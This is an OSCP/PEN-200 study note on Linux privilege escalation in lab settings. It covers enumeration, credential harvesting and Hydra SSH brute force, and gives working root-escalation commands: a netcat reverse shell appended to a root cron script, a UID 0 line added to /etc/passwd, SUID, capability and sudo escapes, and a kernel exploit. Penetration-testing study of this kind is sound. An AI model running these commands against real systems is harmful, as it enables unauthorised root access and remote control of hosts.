---
title: "PEN-200 Chapter 17 - Linux Privilege Escalation"
aliases:
  - "PEN-200 Ch17 Linux PrivEsc"
  - "Linux Privilege Escalation - PEN-200"
tags:
  - oscp
  - pen-200
  - linux
  - privilege-escalation
  - enumeration
  - credentials
  - privesc
source: "PEN-200 - Chapter 17 Linux Privilege Escalation"
chapter: 17
status: study-note
---

# PEN-200 Chapter 17 — Linux Privilege Escalation

> [!abstract] Chapter goal
> This chapter is about turning an existing low-privileged Linux foothold into higher privileges, usually `root`, by combining **local enumeration** with exposed credentials, insecure file permissions, misconfigured SUID/capability/sudo settings, and kernel vulnerabilities.

## Chapter map

- [[#17.1 Enumerating Linux]]
  - [[#17.1.1 Understanding Files and Users Privileges on Linux]]
  - [[#17.1.2 Manual Enumeration]]
  - [[#17.1.3 Automated Enumeration]]
- [[#17.2 Exposed Confidential Information]]
  - [[#17.2.1 Inspecting User Trails]]
  - [[#17.2.2 Inspecting Service Footprints]]
- [[#17.3 Insecure File Permissions]]
  - [[#17.3.1 Abusing Cron Jobs]]
  - [[#17.3.2 Abusing Password Authentication]]
- [[#17.4 Insecure System Components]]
  - [[#17.4.1 Abusing Setuid Binaries and Capabilities]]
  - [[#17.4.2 Abusing Sudo]]
  - [[#17.4.3 Exploiting Kernel Vulnerabilities]]
- [[#17.5 Wrapping Up]]
- [[#Attack chain connection]]
- [[#OSCP mini cheat sheet]]

---

# 17.1 Enumerating Linux

Privilege escalation starts with **knowledge of the local system**. After obtaining a shell, enumerate the current user, other users, OS/kernel, processes, networking, firewall clues, scheduled jobs, software, writable locations, disks, kernel modules, SUID/SGID programs, and other unusual configurations.

The chapter emphasizes that **manual enumeration is still essential**. Automated tools are useful for speed, but they can miss one-off administrator changes and environment-specific misconfigurations.

## 17.1.1 Understanding Files and Users Privileges on Linux

Linux treats most resources as files. Access is primarily controlled with permissions for three classes:

- **owner**
- **group**
- **others**

The basic permission bits are:

| Permission | File meaning | Directory meaning |
|---|---|---|
| `r` | Read file contents | List directory contents |
| `w` | Modify file contents | Create/delete entries in the directory |
| `x` | Execute file | Traverse/access entries inside the directory |

A directory can be executable without being readable. In that case, you may access a known filename if you already know the exact name, but you cannot normally list the directory.

### Inspecting permissions

```bash
ls -l /etc/shadow
```

Example:

```text
-rw-r----- 1 root shadow 1751 May 2 09:31 /etc/shadow
```

**Command explanation**

- `ls` — lists files.
- `-l` — long format, showing permissions, owner, group, size, date, and name.
- `/etc/shadow` — protected password-hash database.

Interpretation of `-rw-r-----`:

- initial `-` = regular file
- owner (`root`) = `rw-`
- group (`shadow`) = `r--`
- others = `---`

> [!tip] OSCP mindset
> Do not only ask, “Can I read this file?” Ask, “Can I **modify something that a more privileged account will later execute or trust**?” That relationship is often the real privilege-escalation path.

---

## 17.1.2 Manual Enumeration

### 1. Identify current user and group context

```bash
id
```

**Purpose:** Determine the current UID, primary GID, and supplementary groups.

Example fields:

- `uid=1000(joe)` — current user ID
- `gid=1000(joe)` — primary group
- `groups=...` — additional groups

**Why it matters:** Group memberships can grant access to devices, logs, containers, packet capture, administration tools, or sensitive files.

---

### 2. Enumerate local users

```bash
cat /etc/passwd
```

**Purpose:** List local accounts and service accounts.

`/etc/passwd` fields are:

```text
username:password-field:UID:GID:comment:home:shell
```

Important observations from the chapter:

- `root` has UID `0`.
- Regular users commonly begin at UID `1000`.
- An `x` in the password field normally means the hash is stored in `/etc/shadow`.
- `/bin/bash` suggests an interactive shell.
- `/usr/sbin/nologin` or `/bin/false` commonly marks a non-interactive service account.
- User home directories can reveal additional human accounts worth investigating.

**Why it matters:** Other users may have better sudo permissions, reused passwords, useful SSH keys, or access to files/services unavailable to the current user.

---

### 3. Identify hostname and likely machine role

```bash
hostname
```

**Purpose:** Print the system hostname.

**Why it matters:** Enterprise naming schemes may hint at role or location, such as web, db, application, or other server functions. Use system commands rather than trusting only the shell prompt.

---

### 4. Identify Linux distribution, release, kernel, and architecture

```bash
cat /etc/issue
cat /etc/os-release
uname -a
```

**Command explanations**

- `cat /etc/issue` — displays system identification normally shown before login.
- `cat /etc/os-release` — distribution metadata such as name, release, ID, and codename.
- `uname -a` — prints broad kernel/system information.
  - `-a` = all available `uname` information, including kernel release and architecture.

**Why it matters:** Kernel exploits and some package-specific exploits are highly version- and architecture-dependent. A mismatched kernel exploit can destabilize or crash the target.

> [!warning] Kernel exploit caution
> The chapter explicitly warns that kernel exploitation can cause instability. Match the distribution, exact kernel family, and architecture carefully, and test locally when possible.

---

### 5. Enumerate running processes

```bash
ps aux
```

**Arguments**

- `a` — show processes for all users with a terminal.
- `x` — also show processes without a controlling TTY.
- `u` — user-oriented output including owner and resource information.

**Why it matters:** Look for:

- root-owned processes
- custom scripts
- unusual command lines
- credentials supplied as command-line arguments
- privileged services with weak files or insecure configuration

A privileged process is interesting when you can influence its executable, config, arguments, working directory, environment, plugins/libraries, or data files.

---

### 6. Enumerate interfaces and internal networks

```bash
ip a
```

The chapter also mentions `ifconfig` on systems where it is present.

**Arguments**

- `ip a` = `ip address`; show address configuration on interfaces.
- `ifconfig -a` — with `-a`, display all interfaces.

**Why it matters:** Multiple interfaces may mean the host is connected to another subnet and can later become a **pivot point**. Loopback-only services can also expose local privilege-escalation opportunities.

---

### 7. Enumerate routes

```bash
routel
```

The chapter also mentions `route` depending on distribution/version.

**Purpose:** Show routing information: connected networks, source addresses, interfaces, and default route.

**Why it matters:** Confirms what networks the compromised machine can reach even if your Kali host cannot reach them directly.

---

### 8. Enumerate listening ports and active connections

```bash
ss -anp
```

The chapter notes that `netstat` can provide similar information.

**Arguments**

- `-a` — all sockets/connections, including listening sockets.
- `-n` — numeric addresses/ports; avoids DNS/name resolution delays.
- `-p` — show the process associated with the socket when permissions allow.

**Why it matters:** Identify:

- services bound only to `127.0.0.1` / `::1`
- internal-only services
- unexpected listening ports
- active sessions
- local targets that were invisible during remote scanning

---

### 9. Inspect firewall clues

Direct firewall enumeration with `iptables` typically requires root, but readable configuration files may leak the active rules.

The chapter mentions:

- `iptables`
- `iptables-persistent`
- `iptables-save`
- `iptables-restore`
- netfilter rules under `/etc/iptables`

Example:

```bash
cat /etc/iptables/rules.v4
```

Example rule:

```text
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
```

**Rule interpretation**

- `-A INPUT` — append rule to INPUT chain.
- `-p tcp` — TCP protocol.
- `-m tcp` — use TCP match extension.
- `--dport 1999` — destination port 1999.
- `-j ACCEPT` — permit matching traffic.

**Why it matters:** A nonstandard allowed port may reveal a service worth investigating. Firewall information also helps later tunneling and pivoting decisions.

---

### 10. Enumerate cron jobs

```bash
ls -lah /etc/cron*
```

**Arguments**

- `-l` — long listing.
- `-a` — include hidden entries.
- `-h` — human-readable sizes.
- `/etc/cron*` — shell wildcard matching crontab and cron directories such as `/etc/cron.daily`, `/etc/cron.d`, etc.

Inspect `/etc/crontab` and scripts referenced by system cron entries. Many system-level jobs run as root.

Current user’s jobs:

```bash
crontab -l
```

- `-l` — list current user’s crontab.

If specifically permitted through sudo, the chapter shows:

```bash
sudo crontab -l
```

This revealed:

```text
* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```

Cron fields:

```text
minute hour day-of-month month day-of-week command
```

`* * * * *` means every minute.

**Why it matters:** A root cron job that executes a writable script is a direct privilege-escalation path.

---

### 11. Enumerate installed packages

Debian-based systems:

```bash
dpkg -l
```

- `dpkg` — Debian package manager.
- `-l` — list packages.

The chapter also mentions `rpm` for Red Hat-derived systems.

**Why it matters:** Record versions of installed applications and compare them with known vulnerabilities. Package data can also corroborate services seen in process/port enumeration.

---

### 12. Find writable directories

```bash
find / -writable -type d 2>/dev/null
```

**Arguments / operators**

- `/` — search from filesystem root.
- `-writable` — objects writable by the current user.
- `-type d` — directories only.
- `2>/dev/null` — redirect stderr (permission-denied noise) to `/dev/null`.

**Why it matters:** Writable directories may contain privileged scripts, executables, service files, cron assets, libraries, or configuration that a high-privilege process trusts.

> [!note]
> The chapter’s listing caption calls these “world writable directories,” while the actual `find ... -writable` predicate means writable by the **current user**. For exam use, interpret the command itself accurately.

---

### 13. Enumerate mounts and unmounted disks

```bash
cat /etc/fstab
mount
lsblk
```

**Purpose**

- `/etc/fstab` — filesystems configured for mounting, commonly at boot.
- `mount` — currently mounted filesystems and mount options.
- `lsblk` — block devices and partitions, whether mounted or not.

**Why it matters:** Forgotten/unmounted disks may contain backups, old credentials, source code, keys, or sensitive documents. Mount options (`nosuid`, `noexec`, etc.) can also affect exploitation possibilities.

The chapter notes that not every mount must appear in `/etc/fstab`; custom scripts can mount drives too. Use both `/etc/fstab` and `mount`, then compare with `lsblk`.

---

### 14. Enumerate kernel modules/drivers

```bash
lsmod
```

**Purpose:** List currently loaded kernel modules.

For a specific module:

```bash
/sbin/modinfo libata
```

**Purpose:** Display metadata for the module, including filename, version, dependencies, signing information, and kernel compatibility fields.

**Why it matters:** Vulnerable drivers/modules can sometimes provide local privilege-escalation paths. You need a precise module/version match before researching an exploit.

---

### 15. Find SUID binaries

Linux has two special executable-related identity bits:

- **SUID / setuid** — run with the file owner’s effective UID.
- **SGID / setgid** — run with the file group’s effective GID.

Search for SUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Arguments**

- `/` — search all filesystems reachable from root.
- `-perm -u=s` — find files with the user SUID bit set.
- `-type f` — regular files only.
- `2>/dev/null` — suppress permission errors.

**Why it matters:** A root-owned SUID binary runs with effective root privileges. If its behavior can be subverted into executing arbitrary commands, it can yield root.

Example concept from the chapter: if a powerful utility such as `cp` were root-SUID, it could potentially overwrite protected files.

---

## 17.1.3 Automated Enumeration

Automated enumeration is useful for building a fast baseline, but the chapter explicitly says it should **not replace manual enumeration**.

### unix-privesc-check

Installed on Kali in the chapter at:

```text
/usr/bin/unix-privesc-check
```

Show usage:

```bash
unix-privesc-check
```

Modes:

- `standard` — faster checks with fewer false positives.
- `detailed` — additional file-handle/library/script permission checks; slower and more prone to false positives.

Run standard mode and save output:

```bash
./unix-privesc-check standard > output.txt
```

**Arguments / operators**

- `standard` — speed-optimized scan mode.
- `>` — redirect stdout to a file, replacing that file if it already exists.
- `output.txt` — saved results for offline review/grep.

In the chapter, the scan identifies `/etc/passwd` as world-writable, which becomes exploitable later.

### Other tools mentioned

- **LinEnum** — Linux enumeration script.
- **linPEAS** — extensive Linux privilege-escalation enumeration from PEASS-ng.

> [!tip] Practical OSCP use
> Run an automated tool for breadth, but manually verify every interesting finding. Automated output is evidence to investigate, not a substitute for understanding the primitive you are exploiting.

---

# 17.2 Exposed Confidential Information

This unit focuses on **credential harvesting** from user activity and service behavior. Credential reuse can turn a low-privileged account into another user or directly into root.

## 17.2.1 Inspecting User Trails

### 1. Environment variables and dotfiles

Display the current environment:

```bash
env
```

The chapter finds:

```text
SCRIPT_CREDENTIALS=lab
```

Inspect Bash startup configuration:

```bash
cat .bashrc
```

The file contains:

```bash
export SCRIPT_CREDENTIALS="lab"
```

**Key idea:** Dotfiles such as `.bashrc` can hold API tokens, passwords, connection strings, aliases, paths, or commands. Environment variables are especially important because custom scripts may rely on them for authentication.

> [!warning]
> Clear-text passwords in environment variables are insecure. The chapter recommends key-based authentication with protected private keys for interactive authentication instead of embedding passwords.

---

### 2. Reuse discovered credentials

Try the discovered credential directly against root:

```bash
su - root
```

Then verify:

```bash
whoami
```

**Explanation**

- `su` — switch user.
- `-` — start a login-style shell using the target user’s environment.
- `root` — target account.
- `whoami` — display the effective username.

In the lab, the leaked value `lab` is accepted for root.

---

### 3. Build a targeted wordlist from a password pattern

```bash
crunch 6 6 -t Lab%%% > wordlist
```

**Arguments**

- first `6` — minimum word length.
- second `6` — maximum word length.
- `-t` — pattern/template mode.
- `Lab%%%` — literal `Lab` followed by three numeric placeholders (`%`).
- `>` — write generated candidates to `wordlist`.

Generated examples:

```text
Lab000
Lab001
...
Lab999
```

**Why use it:** If you discover a likely password convention, a targeted list is usually better than an unrelated giant wordlist.

---

### 4. Brute-force SSH for another local user

```bash
hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
```

**Arguments**

- `-l eve` — single username `eve`.
- `-P wordlist` — password list file.
- `192.168.50.214` — target host.
- `-t 4` — four parallel tasks for the target.
- `ssh` — target protocol/module.
- `-V` — verbose; show attempts.

The lab finds:

```text
eve : Lab123
```

Connect:

```bash
ssh eve@192.168.50.214
```

**Why it matters:** A different local user may possess stronger sudo rights even when the initial foothold user does not.

---

### 5. Check sudo rights and elevate

```bash
sudo -l
```

- `-l` / `--list` — list commands the current user can execute with sudo.

The `eve` account may run `(ALL : ALL) ALL`, meaning unrestricted sudo.

Elevate:

```bash
sudo -i
```

- `-i` — run the target user’s login shell; with default sudo configuration this normally gives a root login shell.

Verify:

```bash
whoami
```

---

## 17.2.2 Inspecting Service Footprints

Services/daemons often execute privileged operations. Even if you cannot read their protected files, **their process command line or network traffic may expose secrets**.

### 1. Continuously monitor process command lines

```bash
watch -n 1 "ps -aux | grep pass"
```

**Arguments / operators**

- `watch` — rerun a command repeatedly.
- `-n 1` — interval of one second.
- quoted command — execute `ps -aux | grep pass` each refresh.
- `grep pass` — show lines containing `pass`.

The chapter observes a root process containing an `sshpass -p ...` command with a clear-text password.

**Why it matters:** `ps` only gives a snapshot. `watch` may catch short-lived cron jobs or daemons that briefly expose credentials in their arguments.

---

### 2. Sniff local traffic when tcpdump is permitted

```bash
sudo tcpdump -i lo -A | grep "pass"
```

**Arguments / operators**

- `sudo` — required because raw packet capture is privileged; in the lab, `joe` has explicit sudo permission for tcpdump.
- `tcpdump` — command-line packet capture tool.
- `-i lo` — capture on loopback interface `lo`.
- `-A` — print packet payload in ASCII.
- `| grep "pass"` — filter displayed packet data for the string `pass`.

The chapter extracts clear-text root credentials from local traffic.

**Why it matters:** Internal or loopback communication may use weak/plaintext authentication even when the service is not remotely exposed.

---

# 17.3 Insecure File Permissions

This unit turns enumeration findings into exploitation when unprivileged users can modify files used by privileged accounts/processes.

## 17.3.1 Abusing Cron Jobs

### 1. Confirm cron execution from logs

```bash
grep "CRON" /var/log/syslog
```

**Purpose:** Search syslog for cron activity.

The lab shows root repeatedly executing:

```text
/bin/bash /home/joe/.scripts/user_backups.sh
```

approximately once per minute.

---

### 2. Inspect the cron script and permissions

```bash
cat /home/joe/.scripts/user_backups.sh
ls -lah /home/joe/.scripts/user_backups.sh
```

Script:

```bash
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
```

**`cp` arguments**

- `-r` — recursive copy.
- `-f` — force overwrite/remove destination conflicts where applicable.

Permissions shown in the chapter:

```text
-rwxrwxrw- 1 root root ... user_backups.sh
```

The script is root-owned but writable by every local user. Since cron runs it as root, modifying it gives command execution as root.

---

### 3. Append a reverse shell

```bash
cd .scripts
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
cat user_backups.sh
```

**Explanation**

- `cd .scripts` — enter the script directory.
- `echo >> file` — append a blank line.
- `>>` — append output without replacing existing file contents.
- `rm /tmp/f` — remove an old named pipe if present.
- `mkfifo /tmp/f` — create a FIFO/named pipe.
- `cat /tmp/f` — read commands from the FIFO.
- `/bin/sh -i` — start an interactive shell.
- `2>&1` — merge stderr into stdout.
- `nc ATTACKER_IP 1234` — connect to attacker’s listener on TCP 1234.
- `>/tmp/f` — feed received data back into the FIFO, completing the shell loop.

> [!note] Source inconsistency
> The command that appends the payload uses `192.168.118.2`, while the later `cat user_backups.sh` output in the chapter shows `10.11.0.4`. Preserve the correct IP for **your own VPN/interface** when reproducing the technique.

---

### 4. Catch the root shell

On Kali:

```bash
nc -lnvp 1234
```

**Arguments**

- `-l` — listen mode.
- `-n` — numeric-only; no DNS resolution.
- `-v` — verbose.
- `-p 1234` — local port 1234.

When cron executes the modified script, verify:

```bash
id
```

Expected privileged context:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Privilege-escalation primitive

```text
Writable script + root cron execution = root command execution
```

This is one of the highest-value relationships to look for during OSCP local enumeration.

---

## 17.3.2 Abusing Password Authentication

Linux normally stores password hashes in `/etc/shadow`. However, for backward compatibility, if the second field of a user entry in `/etc/passwd` contains a password hash, Linux authentication can treat it as valid and it takes precedence over the shadow entry.

Therefore:

```text
Writable /etc/passwd -> ability to add/alter a UID 0 account -> root
```

### 1. Generate a password hash

```bash
openssl passwd w00t
```

**Explanation**

- `openssl` — cryptographic toolkit.
- `passwd` — generate a password hash suitable for password-file use.
- `w00t` — password being hashed.

The chapter notes that output format can vary by OpenSSL/system version; older systems may default differently from newer systems.

Example output:

```text
Fdzt.eqJQ4s0g
```

---

### 2. Add a UID 0 account

```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Fields:

```text
root2 : password_hash : 0 : 0 : root : /root : /bin/bash
```

- UID `0` = root-equivalent account.
- GID `0` = root group.
- `/root` = home.
- `/bin/bash` = interactive shell.

Switch to it:

```bash
su root2
```

Enter:

```text
w00t
```

Verify:

```bash
id
```

> [!warning]
> This technique depends on the serious misconfiguration that `/etc/passwd` is writable by the low-privileged user. Enumeration must confirm this first.

---

# 17.4 Insecure System Components

This unit covers privilege escalation through system features that legitimately grant elevated behavior but are dangerous when configured too broadly:

- SUID binaries
- Linux capabilities
- sudo rules
- kernel vulnerabilities

## 17.4.1 Abusing Setuid Binaries and Capabilities

### A. Understanding real UID vs effective UID

Start `passwd` and leave it waiting:

```bash
passwd
```

In another shell, find the process:

```bash
ps u -C passwd
```

**Arguments**

- `u` — user-oriented process format.
- `-C passwd` — select processes whose executable name is `passwd`.

The process appears owned/effective as root because it must modify `/etc/shadow`.

Inspect its UID fields:

```bash
grep Uid /proc/1932/status
```

Example:

```text
Uid:    1000    0    0    0
```

The four UID values correspond to real, effective, saved-set, and filesystem UID.

Compare with a normal user process:

```bash
cat /proc/1131/status | grep Uid
```

Example:

```text
Uid:    1000    1000    1000    1000
```

---

### B. Inspect the SUID bit

```bash
ls -asl /usr/bin/passwd
```

The relevant permission pattern includes:

```text
-rwsr-xr-x
```

The `s` in the owner-execute position indicates SUID.

The chapter mentions setting this bit with:

```bash
chmod u+s <file>
```

- `u+s` — add set-user-ID bit for the file owner.

A SUID root executable runs with effective UID 0 even when launched by a normal user.

---

### C. Abuse a misconfigured SUID `find`

If enumeration reveals `find` is root-SUID:

```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

**Arguments / syntax**

- `/home/joe/Desktop` — path to search.
- `-exec ... \;` — execute the specified command for matches; `\;` terminates the `-exec` expression in the shell.
- `/usr/bin/bash -p` — start Bash in privileged mode so the elevated effective UID is not automatically dropped.

Verify:

```bash
id
whoami
```

The chapter demonstrates:

```text
uid=1000(joe) ... euid=0(root)
```

and `whoami` reports root.

**Why it works:** SUID provides the effective root identity, and the invoked shell preserves it.

---

### D. Enumerate Linux capabilities

Capabilities divide traditional root privileges into narrower rights.

Search recursively:

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

**Arguments**

- `getcap` — display file capabilities.
- `-r` — recurse.
- `/` — start at filesystem root.
- `2>/dev/null` — suppress access errors.

Interesting chapter finding:

```text
/usr/bin/perl = cap_setuid+ep
```

- `cap_setuid` — permits manipulation of process UIDs.
- `+ep` — capability is effective and permitted.

### E. Abuse Perl `cap_setuid`

The chapter follows GTFOBins and runs:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

**Explanation**

- `perl` — Perl interpreter.
- `-e` — execute supplied Perl code.
- `use POSIX qw(setuid)` — import POSIX `setuid` support.
- `POSIX::setuid(0)` — set UID to 0 using the capability.
- `exec "/bin/sh"` — replace the Perl process with a shell.

Verify:

```bash
id
```

This yields UID 0 in the lab.

### Tool: GTFOBins

**GTFOBins** is a curated reference showing how legitimate UNIX binaries can be abused when they have SUID, sudo, capabilities, or other dangerous execution contexts.

Use it as a lookup after enumeration tells you **which exact binary** is privileged.

---

## 17.4.2 Abusing Sudo

### 1. List allowed sudo commands

```bash
sudo -l
```

The chapter’s `joe` user is allowed to run:

```text
/usr/bin/crontab -l
/usr/sbin/tcpdump
/usr/bin/apt-get
```

The key question is not simply “Do I have sudo?” but:

> **Can any allowed program spawn a shell, execute another program, write arbitrary files, load plugins, invoke a pager/editor, or otherwise escape its intended purpose?**

---

### 2. Attempt a tcpdump sudo escape

The GTFOBins-inspired sequence in the chapter is:

```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

**Command breakdown**

```bash
COMMAND='id'
```

Stores `id` in a shell variable.

```bash
TF=$(mktemp)
```

- `mktemp` — creates a uniquely named temporary file.
- `$(...)` — command substitution; stores resulting path in `TF`.

```bash
echo "$COMMAND" > $TF
chmod +x $TF
```

Writes the command into the temporary file and marks it executable.

`tcpdump` arguments:

- `-l` — line-buffer stdout.
- `-n` — no name resolution.
- `-i lo` — capture loopback.
- `-w /dev/null` — write captured packets to `/dev/null` rather than normal terminal output.
- `-W 1` — limit rotated capture-file count to one in this rotation configuration.
- `-G 1` — rotate the dump file every one second.
- `-z $TF` — run a post-rotation command/script.
- `-Z root` — run after dropping privileges to the specified user (`root` here in the supplied technique).

In the lab this fails with:

```text
Permission denied
```

---

### 3. Investigate why the escape failed

```bash
cat /var/log/syslog | grep tcpdump
```

The audit log shows:

```text
apparmor="DENIED"
```

This identifies **AppArmor** as the blocking control.

AppArmor is a Linux mandatory access control (MAC) framework using application-specific profiles.

The chapter verifies status as root:

```bash
su - root
aa-status
```

`aa-status` shows `/usr/sbin/tcpdump` in enforce mode.

**Lesson:** A technique that is normally exploitable may fail because another security control constrains the binary. Read the error and logs instead of assuming the primitive is impossible.

Tools/concepts involved:

- `auditd` / kernel audit messages — record denied or security-relevant events.
- AppArmor — MAC profile enforcement.
- `aa-status` — report loaded profiles and enforcement state.

---

### 4. Abuse sudo `apt-get`

The third allowed binary is `apt-get`. GTFOBins shows a pager escape:

```bash
sudo apt-get changelog apt
```

This opens the changelog through a pager (`less` in the chapter’s environment). From inside the pager:

```text
!/bin/sh
```

**Explanation**

- `sudo apt-get ...` runs the program with root privileges.
- `changelog apt` requests the `apt` package changelog.
- The pager inherits the elevated context.
- In `less`, `!command` invokes a shell command; `!/bin/sh` therefore starts a root shell in this configuration.

Verify:

```bash
id
```

### Privilege-escalation primitive

```text
Allowed sudo binary + shell/pager/editor/command escape = root
```

---

## 17.4.3 Exploiting Kernel Vulnerabilities

Kernel exploitation is generally a **later choice**, after safer/more deterministic misconfigurations and credentials have been investigated.

### 1. Identify distribution, kernel release, and architecture

```bash
cat /etc/issue
uname -r
arch
```

**Arguments**

- `uname -r` — kernel release only.
- `arch` — machine architecture.

Lab values:

```text
Ubuntu 16.04.4 LTS
4.4.0-116-generic
x86_64
```

> [!note] Source wording discrepancy
> The listing shows `Ubuntu 16.04.4 LTS`, while the following prose in the chapter says `Ubuntu 16.04.3 LTS`. For exploit selection, trust the target’s actual command output and exact kernel details rather than a narrative label.

---

### 2. Search Exploit-DB locally with Searchsploit

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

**Command breakdown**

- `searchsploit "..."` — search local Exploit-DB metadata for the phrase/keywords.
- first `grep "4."` — keep output containing `4.`.
- `grep -v " < 4.4.0"` — exclude lines matching that pattern.
- `grep -v "4.8"` — exclude 4.8-related results.
- `|` — pipe output of one command to the next.
- `-v` in `grep` — invert the match, excluding matching lines.

The chapter selects:

```text
linux/local/45010.c
```

for a Linux kernel `< 4.13.9` local privilege escalation exploit that matches the target family.

**Why it matters:** Search results are candidates, not proof of exploitability. Confirm exact kernel/distro/architecture and read the exploit source/comments.

---

### 3. Copy and inspect exploit source

```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
```

**Explanation**

- `cp SOURCE .` — copy exploit into current directory (`.`).
- `head ... -n 20` — print the first 20 lines to inspect requirements and compilation instructions.

The source comments specify a compile pattern similar to:

```bash
gcc cve-2017-16995.c -o cve-2017-16995
```

and list tested kernel versions including `4.4.0-116-generic`.

Rename to match the exploit instructions:

```bash
mv 45010.c cve-2017-16995.c
```

- `mv` — move/rename.

---

### 4. Transfer source to target

```bash
scp cve-2017-16995.c joe@192.168.123.216:
```

**Explanation**

- `scp` — copy over SSH.
- local file = `cve-2017-16995.c`.
- `joe@192.168.123.216:` — destination user/host; trailing `:` with no path means the remote user’s default/home location.

**Why compile on target when possible:** It naturally uses the target’s architecture and installed libraries, reducing cross-compilation compatibility issues.

---

### 5. Compile exploit

On target:

```bash
gcc cve-2017-16995.c -o cve-2017-16995
```

**Arguments**

- source file = `cve-2017-16995.c`.
- `-o cve-2017-16995` — name the output executable.

No compiler errors generally indicates successful compilation.

---

### 6. Verify binary architecture

```bash
file cve-2017-16995
```

**Purpose:** Identify file type and architecture. The chapter confirms a 64-bit x86-64 ELF executable.

**Why it matters:** Architecture mismatch is a common reason an exploit binary will not run.

---

### 7. Execute exploit

```bash
./cve-2017-16995
```

Then verify:

```bash
id
```

The chapter obtains:

```text
uid=0(root) gid=0(root)
```

### Kernel exploitation workflow

```text
OS/distribution -> kernel version -> architecture -> candidate exploit -> read source/comments -> compile correctly -> verify binary -> execute -> verify root
```

> [!warning] OSCP safety reminder
> Prefer safer credential/configuration/file-permission paths first. Kernel exploits can crash a machine, depend on subtle build/config differences, and may fail even when the version number appears compatible.

---

# 17.5 Wrapping Up

The chapter’s major privilege-escalation families are:

1. **Manual and automated enumeration** — collect enough local information to identify real attack primitives.
2. **Exposed credentials** — environment variables, shell configuration, process command lines, and sniffable traffic.
3. **Insecure file permissions** — especially privileged cron scripts and writable authentication files.
4. **SUID and capabilities** — legitimate privilege delegation that becomes dangerous when attached to abusable binaries.
5. **Misconfigured sudo** — allowed programs that provide a shell or command escape.
6. **Kernel vulnerabilities** — version-matched exploitation when other paths fail.

The recurring pattern is:

```text
Find something privileged -> determine what you can control -> turn that control into privileged execution -> verify effective privilege
```

---

# Attack chain connection

> [!info] Study interpretation
> This section connects Chapter 17 to the broader OSCP-style attack chain. The chapter itself is primarily about the **Privilege Escalation** stage, but its enumeration and credential discoveries directly influence later stages.

```text
Recon -> Enumeration -> Initial Access -> Privilege Escalation -> Credentials -> Pivoting -> AD -> Proof
```

| Attack-chain stage | How Chapter 17 connects |
|---|---|
| **Recon** | Most external recon has already happened before this chapter. Once on the host, hostname, OS, interfaces, services, and software provide additional local context. |
| **Enumeration** | This is the foundation of the chapter: `id`, `/etc/passwd`, OS/kernel, `ps`, `ip`, routes, sockets, cron, packages, writable paths, mounts, modules, SUID, capabilities, and sudo. |
| **Initial Access** | Chapter 17 assumes you already have a low-privileged shell. However, exposed/reused credentials can provide a *new* SSH login as another user. |
| **Privilege Escalation** | **Primary stage.** Abuse writable root cron scripts, writable `/etc/passwd`, SUID binaries, capabilities, sudo escapes, or kernel vulnerabilities to become root. |
| **Credentials** | Environment variables, `.bashrc`, process command lines, and packet captures may reveal clear-text passwords. Root access can then unlock even more local secrets. |
| **Pivoting** | `ip a`, routes, listening sockets, and firewall rules identify additional subnets and internal-only services. A rooted dual-homed Linux host is a strong pivot candidate. |
| **AD** | This chapter is not an Active Directory exploitation chapter. However, a Linux host may hold domain credentials, reach internal AD networks, or provide a privileged pivot into the AD phase. |
| **Proof** | After successful escalation, verify with `id` / `whoami`. In an OSCP workflow, then collect the required proof according to the current exam/lab instructions. The chapter itself demonstrates privilege verification rather than exam-specific proof-file handling. |

### Where to mentally place this chapter

```text
Initial foothold
    |
    v
[Chapter 17 local Linux enumeration]
    |
    +--> credentials found? ------> switch/reuse account
    |
    +--> writable privileged file? -> root
    |
    +--> SUID/capability/sudo? -----> root
    |
    +--> vulnerable kernel? --------> root
    |
    v
Root foothold
    |
    +--> dump/harvest more credentials
    +--> inspect internal routes/interfaces
    +--> tunnel/pivot toward internal hosts / AD
    +--> collect proof
```

---

# Command and tool reference

## Core enumeration commands

| Command/tool | What it tells you | High-value clue |
|---|---|---|
| `id` | UID/GID/groups | privileged group membership |
| `cat /etc/passwd` | users/service accounts | other human/admin users |
| `hostname` | host name | server role/location clue |
| `cat /etc/issue` | distro/banner | exploit compatibility |
| `cat /etc/os-release` | distro/version/codename | exact OS targeting |
| `uname -a` / `uname -r` | kernel/system details | kernel exploit matching |
| `arch` | architecture | x86 vs x64 compatibility |
| `ps aux` | processes | root services, creds in args |
| `ip a` / `ifconfig -a` | interfaces/IPs | dual-homed pivot target |
| `routel` / `route` | routes | hidden/internal networks |
| `ss -anp` / `netstat` | listeners/connections | localhost-only services |
| `/etc/iptables/rules.v4` | firewall rules | unusual exposed/filtered ports |
| `ls -lah /etc/cron*` | cron files | privileged recurring scripts |
| `crontab -l` | user cron | scheduled commands |
| `dpkg -l` / `rpm` | installed packages | vulnerable software versions |
| `find ... -writable` | writable locations | files/dirs privileged code may trust |
| `mount`, `/etc/fstab`, `lsblk` | disks/mounts | forgotten partitions/backups |
| `lsmod`, `modinfo` | modules/drivers | vulnerable kernel components |
| `find ... -perm -u=s` | SUID files | root-owned abusable binaries |
| `getcap -r /` | file capabilities | `cap_setuid`, `cap_dac_*`, etc. |
| `sudo -l` | sudo permissions | direct or indirect command escape |

## Tools emphasized in the chapter

| Tool | Role |
|---|---|
| `unix-privesc-check` | automated UNIX/Linux privilege-escalation checks |
| LinEnum | automated Linux enumeration |
| linPEAS | broad privilege-escalation enumeration |
| `crunch` | generate patterned custom wordlists |
| Hydra | online password brute force, demonstrated against SSH |
| `tcpdump` | packet capture; can expose clear-text local traffic when permitted |
